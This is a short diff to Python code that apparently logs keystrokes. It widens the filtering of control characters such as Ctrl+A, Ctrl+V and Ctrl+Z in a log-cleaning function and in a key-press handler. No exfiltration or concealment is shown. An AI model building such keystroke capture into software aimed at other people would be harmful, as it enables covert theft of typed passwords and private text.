@@ -132,8 +132,9 @@ def process_keylog_text(raw_text):
     # except tab '\t' and newline '\n'
     cleaned = "".join(ch for ch in raw_text if ord(ch) >= 32 or ch in ['\n', '\r', '\t'])
     
-    # Remove any literal string representation of \x03 or other control sequences
-    cleaned = cleaned.replace("\\x03", "").replace("\x03", "")
+    # Remove any literal string representation of control sequences
+    for seq in ["\\x01", "\\x03", "\\x16", "\\x1a", "\\x18", "\x01", "\x03", "\x16", "\x1a", "\x18"]:
+        cleaned = cleaned.replace(seq, "")
     
     # Noise tokens to be removed (both bracketed and raw variants, case-insensitive)
     noises = [
@@ -617,19 +618,14 @@ def on_press(key):
             key_str = "ctrl"
         elif key_str == "Key.print_screen":
             key_str = "print_screen"
-        elif key_str in ("\x03", "\\x03"):
+        elif key_str in ("\x03", "\\x03", "\x16", "\\x16", "\x1a", "\\x1a", "\x01", "\\x01", "\x18", "\\x18"):
             return
-        elif key_str in ("\x16", "\\x16"):
-            key_str = "ctrlv"
-        elif key_str in ("\x1a", "\\x1a"):
-            key_str = "ctrlz"
             
         # Ignore any other special system keys that start with "Key."
         if key_str.startswith("Key."):
             return
             
         # Filter out control characters (ASCII < 32), such as '\x01' (Ctrl+A), except acceptable ones
-        # We also want to handle \x16, \x1a before this step if they were mapped
         if len(key_str) == 1:
             code = ord(key_str)
             if code < 32 and key_str not in ['\n', '\r', '\t']:
